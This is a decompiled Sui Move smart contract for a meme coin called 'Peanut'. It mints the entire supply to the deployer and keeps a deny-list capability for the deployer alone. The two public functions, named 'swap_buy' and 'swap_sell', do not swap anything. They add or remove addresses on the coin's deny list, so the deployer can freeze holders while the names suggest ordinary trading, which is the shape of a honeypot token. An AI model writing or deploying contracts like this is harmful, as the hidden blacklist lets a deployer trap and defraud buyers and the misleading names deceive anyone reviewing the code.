module 0x7fa07910831c8e1eb2ad5e5961440257f24281a098e3be63e1ec980fad9afcb4::peanut {
    struct PEANUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PEANUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEANUT>(arg0, 9, b"Peanut", b"#1 TikTok Squirrel", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmS1LXqkdePkjm2wKs7NBVL1Wzfgx3djrEE49tzsy6fNrw"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PEANUT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEANUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PEANUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEANUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEANUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEANUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEANUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PEANUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

